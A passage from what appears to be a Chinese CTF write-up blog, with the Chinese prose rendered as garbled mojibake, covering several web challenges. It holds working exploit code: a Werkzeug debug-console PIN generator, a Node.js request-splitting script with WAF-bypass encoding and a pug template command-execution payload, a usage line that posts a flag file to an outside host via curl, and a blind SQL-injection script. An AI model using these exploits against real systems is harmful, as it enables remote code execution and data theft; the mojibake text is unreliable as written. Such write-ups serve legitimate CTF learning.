<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address  #wç½‘å¡åœ°å€ï¼Œç„¶åè½¬åè¿›åˆ¶</span><br><span class="line">&#x2F;etc&#x2F;machine-id              #machine-id</span><br></pre></td></tr></table></figure>

<p>ç„¶ååˆ©ç”¨expç”ŸæˆPINç ï¼Œ</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">'flaskweb'</span>,<span class="comment"># username</span></span><br><span class="line">    <span class="string">'flask.app'</span>,<span class="comment"># modname</span></span><br><span class="line">    <span class="string">'Flask'</span>,<span class="comment"># getattr(app, '__name__', getattr(app.__class__, '__name__'))</span></span><br><span class="line">    <span class="string">'/usr/local/lib/python3.7/site-packages/flask/app.py'</span></span><br><span class="line">     <span class="comment"># getattr(mod, '__file__', None),</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">'2485377957892'</span>,<span class="comment"># str(uuid.getnode()),  /sys/class/net/ens33/address</span></span><br><span class="line">    <span class="string">'f3a3a05c96a0a5b36f1af8b3648ad398dc6650ca286ce8c0a39c61bfbbee99b2'</span><span class="comment"># get_machine_id(), /etc/machine-id</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.md5()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> isinstance(bit, str):</span><br><span class="line">        bit = bit.encode(<span class="string">'utf-8'</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b'cookiesalt'</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">'__wzd'</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b'pinsalt'</span>)</span><br><span class="line">    num = (<span class="string">'%09d'</span> % int(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv =<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> len(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">'-'</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">'0'</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>, len(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line">print(rv)</span><br></pre></td></tr></table></figure>

<p>åˆ°/consoleä¸‹ï¼Œè¿è¡Œå‘½ä»¤è¯»flag</p>
<p><img src="/2020/02/22/2020%E6%96%B0%E6%98%A5%E6%88%98%E5%BD%B9%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B/4XYIL%7BC99$TRWEC41%7DXFOEN.png" alt="img"></p>
<h3 id="easy-thinking"><a href="#easy-thinking" class="headerlink" title="easy_thinking"></a>easy_thinking</h3><p>æ‰«ç›®å½•ï¼Œç»™äº†æºç ï¼Œthinkphp6.0,çœ‹åˆ°</p>
<p><img src="/2020/02/22/2020%E6%96%B0%E6%98%A5%E6%88%98%E5%BD%B9%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B/image-20200223220611167.png" alt="image-20200223220611167"></p>
<p>å¼€äº†session,å¯ä»¥åˆ©ç”¨ä¹‹å‰çš„sessionæ–‡ä»¶å†™å…¥ï¼Œå¤§è‡´æµ‹è¯•ä¸‹åŠŸèƒ½ï¼Œçœ‹ä¸‹æºç ï¼Œ</p>
<p><img src="/2020/02/22/2020%E6%96%B0%E6%98%A5%E6%88%98%E5%BD%B9%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B/image-20200223220843928.png" alt="image-20200223220843928"></p>
<p>search å¯ä»¥å°†æˆ‘ä»¬çš„è¾“å…¥å­˜åˆ°sessionä¸­ã€‚</p>
<p>ç„¶åå…ˆå°†PHPSESSIDæ”¹ä¸ºåç¼€ä¸ºphpï¼Œè¿™æ ·å°±å¯ä»¥ç”Ÿæˆsess_xxxxx.phpï¼Œé¦–å…ˆæœç´¢</p>
<p><code>&lt;?php phpinfo(); ?&gt;</code></p>
<p>å¯ä»¥çœ‹åˆ°æœ‰disabled_functionï¼Œç„¶åä¼ ä¸€ä¸ªä¸€å¥è¯ï¼Œç”¨èšå‰‘è¿ä¸Šï¼Œä¸Šä¼ ä¸€ä¸ªä¹‹å‰å¾ˆç«çš„ç»•è¿‡php7å¤§å¤šç‰ˆæœ¬çš„è„šæœ¬ï¼Œæ‰§è¡Œ/readflagï¼Œå®Œäº‹ã€‚</p>
<h3 id="Node-game"><a href="#Node-game" class="headerlink" title="Node_game"></a>Node_game</h3><p>è¿™é¢˜æ˜¯æ”¹çš„nullcon HackIM çš„ä¸€é“é¢˜ï¼Œä»¿ç€åˆ«äººçš„wp,åŠå¤©æ²¡åšå‡ºæ¥ï¼Œæœ€åçœ‹å‡ºé¢˜äººçš„åšå®¢</p>
<p><a href="http://blog.5am3.com/2020/02/11/ctf-node1/#HackTM-CTF-2020-Draw-with-us" target="_blank" rel="noopener">http://blog.5am3.com/2020/02/11/ctf-node1/#HackTM-CTF-2020-Draw-with-us</a>,</p>
<p>æ¼æ´çš„åŸç†å°±æ˜¯ï¼Œnode8åŠ8ä»¥ä¸‹çš„ç‰ˆæœ¬åœ¨è®¾è®¡ä¸Šæœ‰ç¼ºé™·ï¼Œåœ¨å‘é€çš„urlè¯·æ±‚ä¸­å«æœ‰ç‰¹æ®Šæ„é€ çš„éasciiå­—ç¬¦ï¼Œnode åœ¨å¤„ç†è¿™æ ·çš„è¯·æ±‚æ—¶ï¼Œä¼šå°†å…¶é‡‡ç”¨<code>latin1</code>ç¼–ç ï¼Œå¹¶ä¸”ä¼šæŠŠå‰é¢æ„é€ çš„ç‰¹æ®Šå­—ç¬¦è½¬æ¢ä½HTTPæ§åˆ¶å­—ç¬¦ï¼Œå½¢å¦‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:3000&#x2F;query?param&#x3D;1\u&#123;0120&#125;HTTP&#x2F;1.1\u&#123;010D&#125;\u&#123;010A&#125;Host:\u&#123;0120&#125;127.0.0.1:3000\u&#123;010D&#125;\u&#123;010A&#125;Connection:\u&#123;0120&#125;keep-alive\u&#123;010D&#125;\u&#123;010A&#125;\u&#123;010D&#125;\u&#123;010A&#125;GET</span><br></pre></td></tr></table></figure>

<p>ä¼šå˜æˆ</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:3000&#x2F;query?param&#x3D;1 HTTP&#x2F;1.1</span><br><span class="line">Host: 127.0.0.1:3000</span><br><span class="line">Connection: keep-alive</span><br><span class="line"></span><br><span class="line">GET</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œè´´ä¸€ä¸‹5am3å¸ˆå‚…çš„è„šæœ¬</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">shellCodeRaw=<span class="string">"\r\n"</span></span><br><span class="line"><span class="keyword">var</span> shellCodeRawList = shellCodeRaw.split(<span class="string">""</span>)</span><br><span class="line"><span class="keyword">var</span> shellCodeAsciiList= [];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;shellCodeRawList.length;i++)&#123;</span><br><span class="line">	tmp = shellCodeRawList[i].charCodeAt()</span><br><span class="line">	shellCodeAsciiList.push(tmp.toString(<span class="number">16</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">shellcode=shellCodeAsciiList.join(<span class="string">"&#125;\\u&#123;01"</span>);</span><br><span class="line">shellcode= <span class="string">"\\u&#123;01"</span>+shellcode+<span class="string">"&#125;"</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">eval</span>(<span class="string">"encodeURI('"</span>+shellcode+<span class="string">"')"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// \r\n --&gt; %C4%8D%C4%8A</span></span><br><span class="line"><span class="comment">// ç©ºæ ¼ --&gt; %C4%A0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// æ„é€ å¦‚ä¸‹å‚æ•°</span></span><br><span class="line"><span class="comment">//z%C4%A0HTTP/1.1%C4%8D%C4%8A%C4%8D%C4%8A%C4%8D%C4%8AGET%C4%A0/flag%C4%A0HTTP/1.1%C4%8D%C4%8A%C4%8D%C4%8A</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># exp.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">payloadRaw = <span class="string">"""x HTTP/1.1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">POST /file_upload HTTP/1.1</span></span><br><span class="line"><span class="string">Host: localhost:8081</span></span><br><span class="line"><span class="string">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:72.0) Gecko/20100101 Firefox/72.0</span></span><br><span class="line"><span class="string">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span></span><br><span class="line"><span class="string">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><br><span class="line"><span class="string">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="string">Content-Type: multipart/form-data; boundary=---------------------------12837266501973088788260782942</span></span><br><span class="line"><span class="string">Content-Length: 6279</span></span><br><span class="line"><span class="string">Origin: http://localhost:8081</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string">Referer: http://localhost:8081/?action=upload</span></span><br><span class="line"><span class="string">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-----------------------------12837266501973088788260782942</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name="file"; filename="5am3_get_flag.pug"</span></span><br><span class="line"><span class="string">Content-Type: ../template</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">- global.process.mainModule.require('child_process').execSync('evalcmd')</span></span><br><span class="line"><span class="string">-----------------------------12837266501973088788260782942--</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getParm</span><span class="params">(payload)</span>:</span></span><br><span class="line">    payload = payload.replace(<span class="string">" "</span>,<span class="string">"%C4%A0"</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">"\n"</span>,<span class="string">"%C4%8D%C4%8A"</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">"\""</span>,<span class="string">"%C4%A2"</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">"'"</span>,<span class="string">"%C4%A7"</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">"`"</span>,<span class="string">"%C5%A0"</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">"!"</span>,<span class="string">"%C4%A1"</span>)</span><br><span class="line"></span><br><span class="line">    payload = payload.replace(<span class="string">"+"</span>,<span class="string">"%2B"</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">";"</span>,<span class="string">"%3B"</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">"&amp;"</span>,<span class="string">"%26"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Bypass Waf </span></span><br><span class="line">    payload = payload.replace(<span class="string">"global"</span>,<span class="string">"%C5%A7%C5%AC%C5%AF%C5%A2%C5%A1%C5%AC"</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">"process"</span>,<span class="string">"%C5%B0%C5%B2%C5%AF%C5%A3%C5%A5%C5%B3%C5%B3"</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">"mainModule"</span>,<span class="string">"%C5%AD%C5%A1%C5%A9%C5%AE%C5%8D%C5%AF%C5%A4%C5%B5%C5%AC%C5%A5"</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">"require"</span>,<span class="string">"%C5%B2%C5%A5%C5%B1%C5%B5%C5%A9%C5%B2%C5%A5"</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">"root"</span>,<span class="string">"%C5%B2%C5%AF%C5%AF%C5%B4"</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">"child_process"</span>,<span class="string">"%C5%A3%C5%A8%C5%A9%C5%AC%C5%A4%C5%9F%C5%B0%C5%B2%C5%AF%C5%A3%C5%A5%C5%B3%C5%B3"</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">"exec"</span>,<span class="string">"%C5%A5%C5%B8%C5%A5%C5%A3"</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(url,cmd)</span>:</span></span><br><span class="line">    payloadC =  payloadRaw.replace(<span class="string">"evalcmd"</span>,cmd)</span><br><span class="line">    urlC = url+<span class="string">"/core?q="</span>+getParm(payloadC)</span><br><span class="line">    requests.get(urlC)</span><br><span class="line">    </span><br><span class="line">    requests.get(url+<span class="string">"/?action=5am3_get_flag"</span>).text</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    targetUrl = sys.argv[<span class="number">1</span>]</span><br><span class="line">    cmd = sys.argv[<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">print</span> run(targetUrl,cmd)</span><br><span class="line"></span><br><span class="line"><span class="comment"># python exp.py http://127.0.0.1:8081 "curl eval.com -X POST -d `cat /flag.txt`"</span></span><br></pre></td></tr></table></figure>

<p>å‰©ä¸‹ä¸€é“exExpressåäº†åˆ«çš„é˜Ÿçš„è½¦ã€‚é‚£é“æ²¡åšå‡ºæ¥ï¼Œä»¥åè¡¥ä¸Šå§ã€‚</p>
]]></content>
      <tags>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>BUUOJåˆ·é¢˜_1</title>
    <url>/2020/02/07/buuoj-1/</url>
    <content><![CDATA[<p>è®°å½•buuojåˆ·é¢˜</p>
<a id="more"></a>

<h2 id="kzone"><a href="#kzone" class="headerlink" title="kzone"></a>kzone</h2><h4 id="è€ƒç‚¹ï¼šä»£ç å®¡è®¡ã€sqlæ³¨å…¥ã€jsonç¼–ç ç»•è¿‡"><a href="#è€ƒç‚¹ï¼šä»£ç å®¡è®¡ã€sqlæ³¨å…¥ã€jsonç¼–ç ç»•è¿‡" class="headerlink" title="è€ƒç‚¹ï¼šä»£ç å®¡è®¡ã€sqlæ³¨å…¥ã€jsonç¼–ç ç»•è¿‡"></a>è€ƒç‚¹ï¼šä»£ç å®¡è®¡ã€sqlæ³¨å…¥ã€jsonç¼–ç ç»•è¿‡</h4><p>è®¿é—®é“¾æ¥ä¼šè·³è½¬åˆ°qqç©ºé—´ç™»å½•é¡µé¢ï¼Œç”¨dirsearchå¯ä»¥çˆ†ç ´åˆ°<code>www.zip</code>æ–‡ä»¶æ³„éœ²ï¼Œä¸‹è½½ä»£ç è¿›è¡Œå®¡è®¡ï¼Œå®¡è®¡ä»£ç å¤§è‡´æµç¨‹ï¼Œå¯ä»¥å‘ç°included/member.phpä¸­å­˜åœ¨ä¸€å¤„å¼±ç±»å‹æ¯”è¾ƒ</p>
<p><img src="/2020/02/07/buuoj-1/image-20200207143054839-1581129209172.png" alt="image-20200207143054839"></p>
<p>å¦‚æœæƒ³è¦åˆ©ç”¨ï¼Œç›´æ¥è®¿é—®/include/member.phpæ˜¯ä¸å¯ä»¥çš„ï¼Œå¿…é¡»æ˜¯ä»/include/common.phpä¸­åŒ…å«è¿›æ¥ï¼Œå› ä¸ºè¦æ»¡è¶³</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!defined(<span class="string">'IN_CRONLITE'</span>)) <span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°åœ¨/admin/index.php</p>
<p><img src="/2020/02/07/buuoj-1/image-20200207143458244.png" alt="image-20200207143458244"></p>
<p>æ‰€ä»¥å¯ä»¥è®¿é—®admin/index.phpï¼Œåˆ©ç”¨å¼±ç±»å‹æ¯”è¾ƒç»•è¿‡ï¼Œ</p>
<p><img src="/2020/02/07/buuoj-1/image-20200207143759508.png" alt="image-20200207143759508"></p>
<p>åˆ†æç¨‹åºé€»è¾‘è¿˜å¯ä»¥ç”¨å¦ä¸€ä¸ªæ–¹æ³•ç»•è¿‡ï¼Œè¾“å…¥ä¸€ä¸ªä¸å­˜åœ¨çš„admin_userï¼Œé‚£ä¹ˆæŸ¥è¯¢å‡ºæ¥çš„å¯†ç å°±ä¸ºç©ºï¼ŒåŒæ—¶LOGINKEYå¯ä»¥åœ¨æºç ä¸­æ‰¾åˆ°ï¼Œ</p>
<p><img src="/2020/02/07/buuoj-1/image-20200207144337743.png" alt="image-20200207144337743"></p>
<p>ä¹‹åæ‰¾æ³¨å…¥ç‚¹ï¼Œæºç å¯¹GETã€POSTã€COOKIEã€XFFéƒ½è¿›è¡Œäº†è¿‡æ»¤ï¼Œä¸èƒ½æ³¨å…¥ã€‚ä½†åœ¨member.php</p>
<p><img src="/2020/02/07/buuoj-1/image-20200207144631042.png" alt="image-20200207144631042"></p>
<p>å¯¹cookieå…ˆè¿›è¡Œè¿‡æ»¤å†jsonè§£ç ï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡ç¼–ç ç»•è¿‡è¿‡æ»¤ã€‚å°è¯•ä½¿ç”¨sqlmapç¼–å†™tamperä½†æ˜¯æ²¡æœ‰æˆåŠŸã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = payload.replace(<span class="string">'u'</span>, <span class="string">'u0075'</span>)</span><br><span class="line">payload = payload.replace(<span class="string">'o'</span>, <span class="string">'u006f'</span>)</span><br><span class="line">payload = payload.replace(<span class="string">'i'</span>, <span class="string">'u0069'</span>)</span><br><span class="line">payload = payload.replace(<span class="string">"'"</span>, <span class="string">'u0027'</span>)</span><br><span class="line">payload = payload.replace(<span class="string">'"'</span>, <span class="string">'u0022'</span>)</span><br><span class="line">payload = payload.replace(<span class="string">' '</span>, <span class="string">'u0020'</span>)</span><br><span class="line">payload = payload.replace(<span class="string">'s'</span>, <span class="string">'u0073'</span>)</span><br><span class="line">payload = payload.replace(<span class="string">'#'</span>, <span class="string">'u0023'</span>)</span><br><span class="line">payload = payload.replace(<span class="string">'&gt;'</span>, <span class="string">'u003e'</span>)</span><br><span class="line">payload = payload.replace(<span class="string">'&lt;'</span>, <span class="string">'u003c'</span>)</span><br><span class="line">payload = payload.replace(<span class="string">'-'</span>, <span class="string">'u002d'</span>)</span><br><span class="line">payload = payload.replace(<span class="string">'='</span>, <span class="string">'u003d'</span>)</span><br></pre></td></tr></table></figure>

<p>ç¼–å†™è„šæœ¬</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">url&#x3D;&quot;http:&#x2F;&#x2F;fab3873f-f34d-4468-b1d1-df9c59fd565a.node3.buuoj.cn&#x2F;admin&#x2F;&quot;</span><br><span class="line">flag&#x3D;&quot;&quot;</span><br><span class="line">proxies &#x3D; &#123;</span><br><span class="line">  		&quot;http&quot;: &quot;http:&#x2F;&#x2F;127.0.0.1:8080&quot;,</span><br><span class="line">		&#125;</span><br><span class="line">for i in range(1,100):</span><br><span class="line">	high &#x3D; 127</span><br><span class="line">	low &#x3D; 32</span><br><span class="line">	mid &#x3D; (low + high) &#x2F;&#x2F; 2</span><br><span class="line">	while high &gt; low:</span><br><span class="line">		#payload&#x3D;&quot;(asci\\u0069(m\\u0069d((\\u0073elect\\u0020group_concat(column_NAME)\\u0020from\\u0020inf\\u006frmation_schema.columnS\\u0020where\\u0020table_name\\u003d\\u0022fl2222g\\u0022),&#123;&#125;,1))\\u003e&#123;&#125;)&quot;</span><br><span class="line">		payload&#x3D;&quot;(asci\\u0069(m\\u0069d((\\u0073elect\\u0020f44ag\\u0020from\\u0020fl2222g),&#123;&#125;,1))\\u003e&#123;&#125;)&quot;</span><br><span class="line">		data&#x3D;&#39;&#123;&quot;admin_user&quot;:&quot;1\\u0027\\u0020\\u006fr\\u0020&#39;+payload.format(i,mid)+&#39;\\u0023&quot;,&quot;admin_pass&quot;:48&#125;&#39;</span><br><span class="line">		cookie&#x3D;&#123;&quot;islogin&quot;:&#39;1&#39;, &quot;login_data&quot;:data&#125;</span><br><span class="line">		print(cookie)</span><br><span class="line">		r&#x3D;requests.post(url,cookies&#x3D;cookie)#,proxies&#x3D;proxies)</span><br><span class="line">		#print(r.content)</span><br><span class="line">		if b&quot;window.location&quot; not in r.content:</span><br><span class="line">			low&#x3D;mid+1 </span><br><span class="line">		else:</span><br><span class="line">			high&#x3D;mid</span><br><span class="line">		mid&#x3D;(low+high)&#x2F;&#x2F;2</span><br><span class="line">	flag+&#x3D;chr(mid)</span><br><span class="line">	print(flag)</span><br><span class="line">#fish_admin,fish_ip,fish_user,fl2222g </span><br><span class="line">#f44ag</span><br></pre></td></tr></table></figure>

<h2 id="HarekazeCTF2019-Avatar-Uploader-1"><a href="#HarekazeCTF2019-Avatar-Uploader-1" class="headerlink" title="[HarekazeCTF2019]Avatar Uploader 1"></a>[HarekazeCTF2019]Avatar Uploader 1</h2><h4 id="è€ƒç‚¹ï¼šä»£ç å®¡è®¡ã€æ–‡ä»¶ä¸Šä¼ ç±»å‹åˆ¤æ–­ç¼ºé™·"><a href="#è€ƒç‚¹ï¼šä»£ç å®¡è®¡ã€æ–‡ä»¶ä¸Šä¼ ç±»å‹åˆ¤æ–­ç¼ºé™·" class="headerlink" title="è€ƒç‚¹ï¼šä»£ç å®¡è®¡ã€æ–‡ä»¶ä¸Šä¼ ç±»å‹åˆ¤æ–­ç¼ºé™·"></a>è€ƒç‚¹ï¼šä»£ç å®¡è®¡ã€æ–‡ä»¶ä¸Šä¼ ç±»å‹åˆ¤æ–­ç¼ºé™·</h4><p>é¢˜ç›®ç»™äº†æºç ï¼Œæ˜¯ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ ç±»å‹é¢˜ï¼Œå¯ä»¥åœ¨upload.phpä¸­çœ‹åˆ°</p>
<p><img src="/2020/02/07/buuoj-1/image-20200208085525331.png" alt="image-20200208085525331"></p>
<p>æºç ä¸­å…ˆå¯¹æ–‡ä»¶å¤§å°è¿›è¡Œåˆ¤æ–­ï¼Œç„¶åå¯¹æ–‡ä»¶ç±»å‹è¿›è¡Œäº†ä¸¤æ¬¡åˆ¤æ–­ï¼Œç¬¬ä¸€æ¬¡æ˜¯ç”¨<code>finfo_file()</code>ï¼Œé™åˆ¶æ–‡ä»¶ç±»å‹å¿…é¡»ä¸º<code>image/png</code>ã€‚ç„¶ååˆç”¨<code>getimagesize()</code>åˆ¤æ–­ï¼Œå¦‚æœæ–‡ä»¶ç±»å‹ä¸ä¸ºIMAGETYPE_PNGï¼Œå¾—åˆ°flagã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$file = finfo_open(FILEINFO_MIME_TYPE);</span><br><span class="line">var_dump(finfo_file($file, <span class="string">"hazectf.png"</span>));<span class="comment">//string(9) "image/png"</span></span><br><span class="line">finfo_close($file);</span><br><span class="line">$f = getimagesize(<span class="string">"hazectf.png"</span>);</span><br><span class="line">var_dump(getimagesize(<span class="string">"hazectf.png"</span>));<span class="comment">//bool(false)</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/02/07/buuoj-1/image-20200208093107918.png" alt="image-20200208093107918"></p>
<p>å¯¹ä¸Šé¢çš„å›¾ç‰‡</p>
<ul>
<li>finfo_fileï¼šåˆ¤æ–­ç±»å‹ä¸ºimge/png</li>
</ul>
<ul>
<li>getimagesizeï¼šä¸èƒ½åˆ¤æ–­</li>
</ul>
<p>æ‰€ä»¥å¯ä»¥ç»•è¿‡åˆ¤æ–­å¾—åˆ°flag</p>
<p><img src="/2020/02/07/buuoj-1/image-20200208093301821.png" alt="image-20200208093301821"></p>
<h2 id="HarekazeCTF2019-Avatar-Uploader-2"><a href="#HarekazeCTF2019-Avatar-Uploader-2" class="headerlink" title="[HarekazeCTF2019]Avatar Uploader 2"></a>[HarekazeCTF2019]Avatar Uploader 2</h2><h4 id="è€ƒç‚¹ï¼šä»£ç å®¡è®¡ã€æ–‡ä»¶åŒ…å«"><a href="#è€ƒç‚¹ï¼šä»£ç å®¡è®¡ã€æ–‡ä»¶åŒ…å«" class="headerlink" title="è€ƒç‚¹ï¼šä»£ç å®¡è®¡ã€æ–‡ä»¶åŒ…å«"></a>è€ƒç‚¹ï¼šä»£ç å®¡è®¡ã€æ–‡ä»¶åŒ…å«</h4><p>æºç å’Œä¸Šä¸€é¢˜çš„æºç ä¸€æ ·ï¼Œç¬¬ä¸€ä¸ªflagåœ¨æ–‡ä»¶ä¸Šä¼ å‡ºï¼Œç¬¬äºŒä¸ªflagè€ƒç‚¹åœ¨æ–‡ä»¶åŒ…å«ã€‚å®¡è®¡æºç ï¼Œåœ¨index.phpä¸­å­˜åœ¨<code>include()</code>ã€‚</p>
<p><img src="/2020/02/07/buuoj-1/image-20200208093734088.png" alt="image-20200208093734088"></p>
<p>å°½ç®¡<code>include()</code>é™åˆ¶äº†åç¼€ï¼Œä½†æˆ‘ä»¬å¯ä»¥åˆ©ç”¨<code>phar</code>æ¥è§£å†³ã€‚æ¥ä¸‹æ¥ç†æ¸…ä»£ç æ‰§è¡Œæµç¨‹ï¼Œé‡ç‚¹æ˜¯æºç å¯¹sessionçš„æ“ä½œã€‚é¢˜ç›®ç»™äº†æç¤ºï¼š<code>password_hash()</code>å‡½æ•°ã€‚</p>
<p><img src="/2020/02/07/buuoj-1/image-20200208094051650.png" alt="image-20200208094051650"></p>
<p>è¿™ä¸ªå‡½æ•°åœ¨passwordå‚æ•°è¶…è¿‡72åï¼Œå³ä½¿72ä½åé¢çš„å­—ç¬¦ä¸ç›¸åŒï¼Œä¹Ÿè¿”å›ç›¸åŒçš„æ•£åˆ—åçš„å¯†ç ã€‚æ¥ä¸‹æ¥çœ‹ä¸€ä¸‹æºç çš„sessionå¤„ç†æœºåˆ¶ã€‚</p>
<p><img src="/2020/02/07/buuoj-1/image-20200208094857822.png" alt="image-20200208094857822"></p>
<p>åœ¨index.phpä¸­ä¼šnewä¸€ä¸ªsessionï¼Œç„¶åæ‰§è¡Œ<code>SecureClientSession</code>ç±»çš„ææ„å‡½æ•°ï¼Œå°†sessionè®¤è¯åï¼Œè§£ç åèµ‹å€¼ç»™<code>$data</code>ã€‚æˆ‘ä»¬éœ€è¦ä¼ªé€ sessionå€¼ï¼Œä½¿å®ƒèƒ½å¤Ÿç»è¿‡è®¤è¯è€Œä¸”èƒ½å¤Ÿåœ¨<code>$data</code>ä¸­å¢åŠ <code>theme</code>å˜é‡ã€‚ç„¶åå‘ç°</p>
<p><img src="/2020/02/07/buuoj-1/image-20200208100257577.png" alt="image-20200208100257577"></p>
<p><img src="/2020/02/07/buuoj-1/image-20200208100344663.png" alt="image-20200208100344663"></p>
<p>æ‰€ä»¥åœ¨ä¸Šä¼ æ–‡ä»¶åæœªç»è¿‡é‡å®šå‘çš„sessionçš„å€¼ä¸º</p>
<p>eyJuYW1lIjoidHR0dHQiLCJhdmF0YXIiOiIyN2E5NDU4Yi5wbmciLCJmbGFzaCI6eyJ0eXBlIjoiaW5mbyIsIm1lc3N</p>
<p>hZ2UiOiJZb3VyIGF2YXRhciBoYXMgYmVlbiBzdWNjZXNzZnVsbHkgdXBkYXRlZCEifX0.JDJ5JDEwJEM0c3F4W</p>
<p>WQ0QlNFaUExZkZCb0t3NGU4eGlXL0NYdk8yZnJUT1UzWUZXd2lRZktwdlJnaU8y</p>
<p><code>$data</code>jsonç¼–ç åä¸º<code>{&quot;name&quot;:&quot;ttttt&quot;,&quot;avatar&quot;:&quot;27a9458b.png&quot;,&quot;flash{&quot;type&quot;:&quot;info&quot;,&quot;message&quot;:&quot;Your avatar has been successfully updated!&quot;}}</code></p>
<p>é•¿åº¦æ˜æ˜¾è¶…è¿‡72ï¼Œç„¶ååœ¨sessionä¸­æ·»åŠ <code>theme</code>è¾¾åˆ°æ•ˆæœã€‚</p>
<h5 id="è§£é¢˜æ­¥éª¤"><a href="#è§£é¢˜æ­¥éª¤" class="headerlink" title="è§£é¢˜æ­¥éª¤"></a>è§£é¢˜æ­¥éª¤</h5><ol>
<li><p>ç”Ÿæˆpharæ–‡ä»¶</p>
